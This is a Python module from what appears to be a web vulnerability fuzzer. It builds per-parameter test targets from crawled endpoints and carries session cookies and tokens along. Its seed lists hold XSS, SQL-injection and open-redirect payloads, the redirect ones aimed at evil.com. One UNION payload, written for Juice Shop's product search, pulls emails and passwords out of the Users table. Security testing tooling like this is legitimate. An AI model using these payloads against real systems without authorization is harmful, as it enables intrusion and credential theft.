# backend/modules/target_builder.py
from __future__ import annotations

import json, uuid, random, string
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import (
    urlparse, urlencode, urlunparse, parse_qs, quote_plus
)

DEFAULT_TIMEOUT_S = 12.0

# ---- noise filters ----------------------------------------------------------
STATIC_EXT = (
    ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
    ".woff", ".woff2", ".ttf", ".map", ".md"
)
SKIP_PATH_SUBSTR = ("/socket.io/",)

def _is_static_asset(url: str) -> bool:
    u = (url or "").lower()
    return any(u.endswith(ext) for ext in STATIC_EXT)

def _is_noise_url(url: str) -> bool:
    if not url:
        return True
    path = urlparse(url).path
    if any(s in path for s in SKIP_PATH_SUBSTR):
        return True
    return _is_static_asset(url)

# for legacy helpers
def _skip_noise(url: str) -> bool:
    return _is_noise_url(url)

# ---- token-ish params to ignore --------------------------------------------
TOKEN_KEYS = {
    "csrf", "_csrf", "xsrf", "_xsrf",
    "authenticity_token",
    "__requestverificationtoken", "requestverificationtoken", "_requestverificationtoken",
    "token", "id_token", "access_token"
}
def _is_token_param(name: Optional[str]) -> bool:
    if not name: return True
    n = name.lower()
    return any(k in n for k in TOKEN_KEYS)

# ---- optional ML prioritizer (nice-to-have; safe if missing) ---------------
try:
    # tiny model that scores (method, url, param) -> [0..1]
    from ..modules.ml.param_prioritizer import ParamPrioritizer  # type: ignore
    _PP: Optional[ParamPrioritizer] = ParamPrioritizer()
    try:
        _PP.load()
    except Exception:
        _PP = None
except Exception:
    _PP = None
# ---------------------------------------------------------------------------

# Payload families (seed lists; fuzzer will extend context-aware)
PAYLOADS = {
    "xss": [
        '"><svg/onload=alert(1)>',
        "'\"><img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
    ],
    # Include SQLite-friendly boolean payloads (with comment styles) up-front.
    "sqli": [
        # string-context booleans
        "' OR '1'='1--",
        "' OR '1'='2--",
        "' OR '1'='1'--",
        "' OR '1'='2'--",
        "' OR '1'='1' /*",
        "' OR '1'='2' /*",
        # unquoted/number-context variants
        "1 OR 1=1--",
        "1 OR 1=2--",
        "' OR 1=1--",
        "' OR 1=2--",
        # parenthesis closer (common in filters)
        "')) OR 1=1--",
        "')) OR 1=2--",
        # keep a couple of generic extras
        "' UNION SELECT NULL--",
        "';WAITFOR DELAY '0:0:3'--",  # may no-op on SQLite; harmless
    ],
    # Expanded set of realistic allow-list bypass attempts
    "redir": [
        # bare domains / schemed
        "//evil.com",
        "http://evil.com",
        "https://evil.com",
        "http://127.0.0.1",
        "http://localhost",
        # encoding variants / colon tricks
        "http:%2f%2fevil.com",
        "https:%2f%2fevil.com",
        "%2f%2fevil.com",
        "https:////evil.com",
        "http:\\\\evil.com",
        "///\\evil.com",
        # userinfo tricks
        "http://evil.com@allowed.com",
        "https://allowed.com@evil.com",
        # look-alikes / suffix games / whitespace
        "https://evil.com.",
        "https://evil.com%20",
        "https://evil.com%09",
        # subdomain bait
        "https://allowed.com.evil.com",
    ],
    "base": ["__X__", "__X1__", "__X2__"],  # generic reflection probes
}

def _rand_control(prefix="ctrl") -> str:
    return prefix + "_" + "".join(random.choices(string.ascii_letters + string.digits, k=8))

def _cookie_header_from_storage(storage_state_path: Optional[Path], domain: Optional[str]) -> Optional[str]:
    if not storage_state_path or not storage_state_path.exists():
        return None
    try:
        data = json.loads(storage_state_path.read_text("utf-8"))
        jar = []
        for c in data.get("cookies", []):
            cdomain = (c.get("domain") or "").lstrip(".")
            if not cdomain or not c.get("name"):
                continue
            # domain suffix match either way to be lenient with subdomains
            if not domain or domain.endswith(cdomain) or cdomain.endswith(domain):
                jar.append(f"{c['name']}={c.get('value','')}")
        return "; ".join(jar) if jar else None
    except Exception:
        return None

def _find_storage_state(job_dir: Path) -> Optional[Path]:
    """
    Prefer the crawler-recorded session_state_path inside crawl_result.json,
    else fall back to <job_dir>/storage_state.json if present.
    """
    try:
        blob = json.loads((job_dir / "crawl_result.json").read_text("utf-8"))
        p = blob.get("session_state_path") or blob.get("storage_state_path")
        if p:
            pth = Path(p)
            if pth.exists():
                return pth
    except Exception:
        pass
    p2 = job_dir / "storage_state.json"
    return p2 if p2.exists() else None

def _inject_query(url: str, param: str, value: str) -> str:
    u = urlparse(url)
    q = parse_qs(u.query, keep_blank_values=True)
    q[param] = [value]
    qs = urlencode([(k, v) for k, vs in q.items() for v in (vs if isinstance(vs, list) else [vs])])
    return urlunparse((u.scheme, u.netloc, u.path, u.params, qs, u.fragment))

def _baseline_value(name: str) -> str:
    n = name.lower()
    if "mail" in n or "email" in n:
        return "test@example.com"
    if "user" in n or "name" in n:
        return "tester"
    if "pass" in n:
        return "Passw0rd!"
    if any(k in n for k in ["id", "uid", "num", "qty", "count", "page", "offset", "limit"]):
        return "1"
    return "test"

def _payload_plan(param_name: str, method: str, content_type: Optional[str], path: str) -> List[str]:
    """
    Provide a smart seed list per-parameter. The fuzzer will still add its own
    context-aware probes. This ensures we hit your 'proven' cases quickly.
    """
    n = (param_name or "").lower()
    pth = (path or "").lower()
    plan: List[str] = []

    # --- XSS probes for user-visible/reflected fields
    if any(k in n for k in ["q", "query", "search", "name", "title", "comment", "message", "content", "text"]):
        plan += PAYLOADS["xss"] + PAYLOADS["base"]

    # --- SQLi probes for identifiers/search
    if any(k in n for k in ["id", "uid", "user", "product", "item", "order", "sort", "orderby", "q", "query", "search", "s"]):
        plan += PAYLOADS["sqli"] + PAYLOADS["base"]
        # Juice Shop: add known-good SQLite-friendly payloads for /rest/products/search
        if "/rest/products/search" in pth or n in ("q", "query", "search", "s"):
            plan += [
                # booleans that visibly change result set
                "' OR 1=1--",
                "' OR 1=2--",
                # UNION that matches the products query (10 columns; many NULLs)
                "qwert')) UNION SELECT NULL,id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--",
            ]

    # --- Login-ish fields (JSON or form)
    looks_like_login = ("login" in pth) or (n in {"email","username","user","login"})
    if looks_like_login and (method.upper() in {"POST","PUT","PATCH"}):
        # Ensure boolean-based SQLi is tried first
        plan = ["' OR '1'='1' -- ", "' OR '1'='2' -- "] + plan

    # --- Open-redirect probes
    if any(k in n for k in ["url", "next", "to", "dest", "redirect", "return", "return_to", "redirect_uri", "callback", "continue"]):
        plan += PAYLOADS["redir"] + PAYLOADS["base"]

    # Weak context fallback
    if not plan and method.upper() == "POST" and (content_type or "").startswith("application/json"):
        plan += PAYLOADS["sqli"][:2] + PAYLOADS["base"]
    if not plan:
        plan = PAYLOADS["base"]

    # dedupe while preserving order
    seen, out = set(), []
    for p in plan:
        if p not in seen:
            seen.add(p); out.append(p)
    return out

def _priority_score(method: str, url: str, param: str) -> float:
    if _PP:
        try:
            return float(_PP.predict_proba(method, url, param))
        except Exception:
            pass
    # fallback heuristics
    s = 0.0
    lp, lu = (param or "").lower(), (url or "").lower()
    if lp in {"id","uid","pid","productid","user","q","search","query","s","to","return_to","redirect","url","redirect_uri"}:
        s += 0.6
    if any(x in lu for x in ("/login", "/auth", "/admin", "/search", "/redirect", "/report", "/download", "/rest/products/search", "/rest/user/login")):
        s += 0.25
    if method.upper() in {"GET", "DELETE"}:
        s += 0.1
    return min(1.0, s)

def _merge_headers(h1: Optional[Dict[str, str]], h2: Optional[Dict[str, str]]) -> Dict[str, str]:
    """
    Merge headers left-to-right; later dict wins.
    """
    out: Dict[str, str] = {}
    for src in (h1 or {}), (h2 or {}):
        for k, v in src.items():
            out[k] = v
    return out

def _augment_headers(h: Dict[str, str], url: str) -> Dict[str, str]:
    """Add light, browser-ish defaults if missing for more stable responses."""
    out = dict(h or {})
    lower = {k.lower(): k for k in out.keys()}

    def set_if_absent(k: str, v: str):
        if k.lower() not in lower:
            out[k] = v

    set_if_absent("User-Agent", "Mozilla/5.0 (compatible; elise-target-builder/1.0)")
    path = (urlparse(url).path or "").lower()
    wants_json = ("/api/" in path) or ("/rest/" in path)
    set_if_absent("Accept", "application/json, */*;q=0.8" if wants_json else "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    u = urlparse(url)
    if u.scheme and u.netloc:
        set_if_absent("Referer", f"{u.scheme}://{u.netloc}/")
    set_if_absent("Accept-Language", "en-US,en;q=0.8")
    return out

def _canonical_ctype(ctype: Optional[str], body_type: Optional[str]) -> Optional[str]:
    c = (ctype or "").lower().strip()
    if c:
        return c
    bt = (body_type or "").lower().strip()
    if bt == "json":
        return "application/json"
    if bt == "form":
        return "application/x-www-form-urlencoded"
    return None

def _dedupe_key(method: str, url: str, where: str, param: str, ctype: Optional[str]) -> Tuple[str, str, str, str, str]:
    return (method.upper(), url, where, param, (ctype or "").lower())

def _unique(seq: List[str]) -> List[str]:
    """Order-preserving dedupe."""
    seen, out = set(), []
    for x in seq:
        if x and x not in seen:
            seen.add(x); out.append(x)
    return out

def _infer_query_keys_from_url(url: str) -> List[str]:
    try:
        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
        return list(qs.keys())
    except Exception:
        return []

def _infer_body_keys_from_templates(ep: Dict[str, Any], ctype: Optional[str]) -> List[str]:
    # JSON body
    if (ctype or "").startswith("application/json"):
        tmpl = ep.get("body_template")
        if isinstance(tmpl, dict):
            return list(tmpl.keys())
    # Form payloads
    ft = ep.get("form_template")
    if isinstance(ft, dict):
        return list(ft.keys())
    if isinstance(ft, list):
        keys: List[str] = []
        for item in ft:
            if isinstance(item, dict) and item.get("name"):
                keys.append(item["name"])
        return keys
    return []

# =============================================================================
# Core builder for fuzzer_core.run_fuzz
# =============================================================================
def build_targets(
    merged_endpoints: List[Dict[str, Any]],
    job_dir: Path,
    bearer_token: Optional[str] = None,
    timeout_s: float = DEFAULT_TIMEOUT_S,
) -> Path:
    """
    Build param-exact fuzz targets consumed by fuzzer_core.run_fuzz.

    INPUT: merged_endpoints from crawler (each with:
           url, method, param_locs {query:[...], body:[...]}, content_type | body_type,
           [body_template|form_template], [headers])
    OUTPUT: <job_dir>/targets.json
            {"targets":[
                {
                  "id": str,
                  "method": "GET"|"POST"|...,
                  "url": str,                 # baseline URL (control value injected if 'in'=="query")
                  "in": "query"|"body",
                  "target_param": str,
                  "content_type": str|None,   # for body targets
                  "headers": dict,            # Authorization/Cookie included if present
                  "body": str|dict|None,      # baseline body with control value for 'body'
                  "control_value": str,
                  "payloads": [str, ...],
                  "timeout": float,
                  "priority": float
                }, ...
            ]}
    """
    job_dir = Path(job_dir)
    job_dir.mkdir(parents=True, exist_ok=True)

    # Cookie jar
    storage_state = _find_storage_state(job_dir)
    # Domain from first same-origin endpoint if any
    domain = urlparse(merged_endpoints[0]["url"]).hostname if merged_endpoints else None
    cookie_header = _cookie_header_from_storage(storage_state, domain)

    targets: List[Dict[str, Any]] = []
    seen: set[Tuple[str, str, str, str, str]] = set()

    for ep in merged_endpoints:
        url = ep.get("url") or ""
        method = (ep.get("method") or "GET").upper()

        # Skip noisy/static endpoints early
        if _is_noise_url(url):
            continue

        # Only consider standard HTTP verbs
        if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            continue

        path = urlparse(url).path
        ctype = _canonical_ctype(ep.get("content_type"), ep.get("body_type"))

        # Base param locations from crawler (may be empty)
        param_locs = ep.get("param_locs") or {
            # ⚠️ include legacy fields too
            "query": (ep.get("query_keys") or ep.get("params") or []),
            "body": ep.get("body_keys", []),
        }

        # --- Assemble candidate query params (merge everything, keep order)
        q_candidates: List[str] = []
        # 1) canonical / crawler
        if isinstance(param_locs.get("query"), list):
            q_candidates += param_locs.get("query")  # type: ignore
        # 2) legacy fields explicitly
        if isinstance(ep.get("params"), list):
            q_candidates += ep.get("params")  # type: ignore
        if isinstance(ep.get("query_keys"), list):
            q_candidates += ep.get("query_keys")  # type: ignore
        # 3) URL inference (handles blanks like ?q=)
        from_url = _infer_query_keys_from_url(url)
        if from_url:
            q_candidates += from_url
        # 4) Last-ditch heuristic: obvious search endpoints
        if not q_candidates:
            low = (url or "").lower()
            if "/search" in low and "?" in low:
                q_candidates.append("q")
        q_candidates = _unique(q_candidates)
        q_params: List[str] = [p for p in q_candidates if p and not _is_token_param(p)]

        # --- Assemble candidate body params (with template fallback)
        b_candidates: List[str] = []
        if isinstance(param_locs.get("body"), list):
            b_candidates += param_locs.get("body")  # type: ignore
        if isinstance(ep.get("body_keys"), list):
            b_candidates += ep.get("body_keys")  # type: ignore
        if not b_candidates:
            b_candidates += _infer_body_keys_from_templates(ep, ctype)
        b_candidates = _unique(b_candidates)
        b_params: List[str] = [p for p in b_candidates if p and not _is_token_param(p)]

        # If we truly have nothing actionable, skip
        if not q_params and not b_params:
            continue

        # Merge safe headers: start with captured headers (if any), then add auth cookie/bearer
        cap_headers = ep.get("headers") if isinstance(ep.get("headers"), dict) else {}
        headers: Dict[str, str] = {}
        if bearer_token:
            bt = bearer_token.strip()
            headers["Authorization"] = bt if bt.lower().startswith("bearer ") else f"Bearer {bt}"
        if cookie_header:
            headers["Cookie"] = cookie_header
        # ensure our Authorization/Cookie override captured
        headers = _merge_headers(cap_headers, headers)
        # add gentle browser-like defaults
        headers = _augment_headers(headers, url)

        # Build baseline templates (prefer crawler-provided)
        form_template: Dict[str, str] = {}
        json_template: Dict[str, Any] = {}

        if ctype == "application/json":
            # Prefer provided body_template; else synthesize from b_params
            src = ep.get("body_template") or {k: _baseline_value(k) for k in b_params}
            if isinstance(src, dict):
                # include all keys from template OR discovered body params
                keys = list({*list(src.keys()), *b_params})
                for k in keys:
                    v = src.get(k)
                    json_template[k] = v if v is not None else _baseline_value(k)
        elif method in {"POST", "PUT", "PATCH"}:
            # assume x-www-form-urlencoded by default
            # Prefer provided form_template; else synthesize from b_params
            ft = ep.get("form_template")
            if isinstance(ft, dict):
                for k, v in ft.items():
                    if not _is_token_param(k):
                        form_template[k] = v if v is not None else _baseline_value(k)
            elif isinstance(ft, list):
                for i in ft:
                    if isinstance(i, dict) and i.get("name") and not _is_token_param(i["name"]):
                        form_template[i["name"]] = _baseline_value(i["name"])
            # fallback to discovered keys
            for k in b_params:
                if k not in form_template and not _is_token_param(k):
                    form_template[k] = _baseline_value(k)

        # === Per-parameter targets ===
        # Query params
        for p in q_params:
            ctrl = _rand_control()
            base_url = _inject_query(url, p, ctrl)  # ensure target param is present with control value
            key = _dedupe_key(method, base_url, "query", p, None)
            if key in seen:
                continue
            seen.add(key)
            t = {
                "id": str(uuid.uuid4()),
                "method": method,
                "url": base_url,
                "in": "query",
                "target_param": p,
                "content_type": None,
                "headers": dict(headers),
                "body": None,
                "control_value": ctrl,
                "payloads": _payload_plan(p, method, ctype, path),
                "timeout": float(timeout_s),
                "priority": _priority_score(method, url, p),
            }
            targets.append(t)

        # Body params
        for p in b_params:
            ctrl = _rand_control()
            if ctype == "application/json":
                body = {**json_template, p: ctrl} if json_template else {p: ctrl}
                headers_body = _merge_headers(headers, {"Content-Type": "application/json"})
            else:
                # x-www-form-urlencoded (string)
                ft = {**form_template, p: ctrl} if form_template else {p: ctrl}
                body = "&".join(f"{k}={quote_plus(str(v))}" for k, v in ft.items())
                headers_body = _merge_headers(headers, {"Content-Type": "application/x-www-form-urlencoded"})

            key = _dedupe_key(method, url, "body", p, ctype)
            if key in seen:
                continue
            seen.add(key)

            t = {
                "id": str(uuid.uuid4()),
                "method": method,
                "url": url,
                "in": "body",
                "target_param": p,
                "content_type": ctype,
                "headers": headers_body,
                "body": body,
                "control_value": ctrl,
                "payloads": _payload_plan(p, method, ctype, path),
                "timeout": float(timeout_s),
                "priority": _priority_score(method, url, p),
            }
            targets.append(t)

    # Sort by priority desc (so the fuzzer hits juicier params first)
    targets.sort(key=lambda t: t.get("priority", 0.0), reverse=True)

    out_path = job_dir / "targets.json"
    out_path.write_text(json.dumps({"targets": targets}, indent=2), "utf-8")
    return out_path


# =============================================================================
# Legacy path: captured-traffic -> ffuf targets list (kept for compatibility)
# =============================================================================

# locations for reading crawls (legacy builder)
REPO_ROOT = Path(__file__).resolve().parents[2]
JOBS_DIR = REPO_ROOT / "data" / "jobs"

def _load_crawl(job_id: str) -> Dict[str, Any]:
    job_dir = JOBS_DIR / job_id
    f = job_dir / "crawl_result.json"
    if not f.exists():
        legacy = REPO_ROOT / "data" / "crawl_result.json"
        if legacy.exists():
            return json.loads(legacy.read_text(encoding="utf-8"))
        raise FileNotFoundError(f"crawl_result.json not found for job {job_id} at {f}")
    return json.loads(f.read_text(encoding="utf-8"))

def _infer_base_host(blob: Dict[str, Any]) -> str:
    target = blob.get("target") or blob.get("target_url") or ""
    host = urlparse(target).netloc
    if host:
        return host
    for coll in (blob.get("captured_requests") or []), (blob.get("endpoints") or []):
        for item in coll:
            u = item.get("url") or ""
            h = urlparse(u).netloc
            if h:
                return h
    return ""

def _same_origin(url: str, base_host: str) -> bool:
    try:
        return base_host and (urlparse(url).netloc == base_host)
    except Exception:
        return False

def _normalize_url_for_ffuf(url: str) -> str:
    return (url or "").split("#", 1)[0]

def _path_only(url: str) -> str:
    try:
        p = urlparse(url)
        return urlunparse((p.scheme, p.netloc, p.path, "", "", ""))
    except Exception:
        return url

def _shape_sig(method: str, url: str, param: str, body_type: Optional[str]) -> Tuple[str, str, str, str]:
    m = (method or "GET").upper()
    pathish = _path_only(_normalize_url_for_ffuf(url))
    bt = (body_type or "").lower() or "query"
    return (m, pathish, param, bt)

def _count_shapes(captured: List[Dict[str, Any]]) -> Dict[Tuple[str, str, str, str], int]:
    counts: Dict[Tuple[str, str, str, str], int] = {}
    for r in captured:
        url = r.get("url") or ""
        method = (r.get("method") or "GET").upper()
        if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            continue
        if method in {"GET", "DELETE"}:
            qs = parse_qs(urlparse(url).query, keep_blank_values=True)
            for param in qs.keys():
                sig = _shape_sig(method, url, param, None)
                counts[sig] = counts.get(sig, 0) + 1
        else:
            body_parsed = r.get("body_parsed")
            body_type = r.get("body_type")
            if isinstance(body_parsed, dict):
                for param in body_parsed.keys():
                    sig = _shape_sig(method, url, param, body_type)
                    counts[sig] = counts.get(sig, 0) + 1
    return counts

def _build_from_capture(
    captured: List[Dict[str, Any]],
    job_id: str,
    session_headers: Dict[str, str],
    counts: Dict[Tuple[str, str, str, str], int],
) -> List[Dict[str, Any]]:
    targets: List[Dict[str, Any]] = []
    seen_shapes: set[Tuple[str, str, str, str]] = set()

    for r in captured:
        url = r.get("url")
        if not url:
            continue
        method = (r.get("method") or "GET").upper()
        headers = {**session_headers}
        body_type = r.get("body_type")
        body_parsed = r.get("body_parsed")

        if method in {"GET", "DELETE"}:
            qs = parse_qs(urlparse(url).query, keep_blank_values=True)
            for param in sorted(qs.keys()):
                sig = _shape_sig(method, url, param, None)
                if sig in seen_shapes:
                    continue
                seen_shapes.add(sig)
                targets.append({
                    "url": _normalize_url_for_ffuf(url),
                    "param": param,
                    "method": method,
                    "job_id": job_id,
                    "headers": headers,
                    "meta": {
                        "headers": headers,
                        "body": None,
                        "body_type": None,
                        "seed": {"value": qs.get(param, [None])[-1]},
                        "source": "captured",
                        "freq": counts.get(sig, 0),
                    }
                })
        elif method in {"POST", "PUT", "PATCH"} and isinstance(body_parsed, dict):
            for param in sorted(body_parsed.keys()):
                sig = _shape_sig(method, url, param, body_type)
                if sig in seen_shapes:
                    continue
                seen_shapes.add(sig)
                targets.append({
                    "url": _normalize_url_for_ffuf(url),
                    "param": param,
                    "method": method,
                    "job_id": job_id,
                    "headers": headers,
                    "meta": {
                        "headers": headers,
                        "body": body_parsed,
                        "body_type": body_type,
                        "seed": {"value": str(body_parsed.get(param)) if body_parsed.get(param) is not None else None},
                        "source": "captured",
                        "freq": counts.get(sig, 0),
                    }
                })
    return targets

def _add_priority_scores(targets: List[Dict[str, Any]]) -> None:
    for t in targets:
        m = t.get("method") or "GET"
        u = t.get("url") or ""
        p = t.get("param") or ""
        freq = int(((t.get("meta") or {}).get("freq")) or 0)
        score = 0.0
        if _PP:
            try:
                score = float(_PP.predict_proba(m, u, p))
            except Exception:
                score = 0.0
        else:
            lp = p.lower()
            lu = u.lower()
            if lp in {"id","uid","pid","productid","user","q","search","query","to","return_to","redirect","url"}:
                score += 0.6
            if any(x in lu for x in ("/login", "/auth", "/admin", "/search", "/redirect", "/report", "/download", "/rest/products/search", "/rest/user/login")):
                score += 0.25
            if (t.get("method") or "").upper() in {"GET", "DELETE"}:
                score += 0.1
        score += min(0.3, 0.03 * max(0, freq))
        t["priority"] = float(min(1.0, score))

def build_fuzz_targets_for_job(job_id: str) -> List[Dict[str, Any]]:
    """
    Legacy path used by the ffuf flow: turn captured requests into FuzzTarget dicts.
    """
    blob = _load_crawl(job_id)
    base_host = _infer_base_host(blob)

    # synthesize Cookie from storage_state
    state_path = (JOBS_DIR / job_id / "storage_state.json")
    cookie_header = _cookie_header_from_storage(state_path if state_path.exists() else None, base_host)
    session_headers: Dict[str, str] = {}
    if cookie_header:
        session_headers["Cookie"] = cookie_header

    captured_all = blob.get("captured_requests") or []
    endpoints_all = blob.get("endpoints") or []

    # Filter captured to same-origin, non-static, non-socket.io
    captured = [
        r for r in captured_all
        if _same_origin(r.get("url", ""), base_host) and not _skip_noise(r.get("url", ""))
    ]

    # Count shapes to compute frequency
    counts = _count_shapes(captured)

    targets = _build_from_capture(captured, job_id, session_headers, counts)

    # Fallbacks from "endpoints" if capture missed them
    seen = {(t["method"], _path_only(t["url"]), t["param"], (t.get("meta") or {}).get("body_type") or "query") for t in targets}
    for ep in endpoints_all:
        url = ep.get("url") or ""
        if not _same_origin(url, base_host) or _skip_noise(url):
            continue
        method = (ep.get("method") or "GET").upper()

        explicit_params = ep.get("params") if isinstance(ep.get("params"), list) else None
        explicit_body_keys = ep.get("body_keys") if isinstance(ep.get("body_keys"), list) else None
        body_type_hint = (ep.get("body_type") or "").lower() or None

        if method in {"GET", "DELETE"}:
            keys = explicit_params if explicit_params else list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())
            for param in sorted(keys):
                sig = (method, _path_only(_normalize_url_for_ffuf(url)), param, "query")
                if sig in seen: continue
                headers = session_headers.copy()
                targets.append({
                    "url": _normalize_url_for_ffuf(url),
                    "param": param,
                    "method": method,
                    "job_id": job_id,
                    "headers": headers,
                    "meta": {
                        "headers": headers,
                        "body": None,
                        "body_type": None,
                        "seed": {"value": None},
                        "source": "endpoints_fallback",
                        "freq": 0,
                    }
                })
                seen.add(sig)

        elif method in {"POST", "PUT", "PATCH"} and explicit_body_keys:
            for param in sorted(explicit_body_keys):
                sig = (method, _path_only(_normalize_url_for_ffuf(url)), param, body_type_hint or "json")
                if sig in seen: continue
                headers = session_headers.copy()
                targets.append({
                    "url": _normalize_url_for_ffuf(url),
                    "param": param,
                    "method": method,
                    "job_id": job_id,
                    "headers": headers,
                    "meta": {
                        "headers": headers,
                        "body": None,
                        "body_type": body_type_hint,
                        "seed": {"value": None},
                        "source": "endpoints_fallback",
                        "freq": 0,
                    }
                })
                seen.add(sig)

    _add_priority_scores(targets)
    targets.sort(key=lambda t: t.get("priority", 0.0), reverse=True)
    return targets
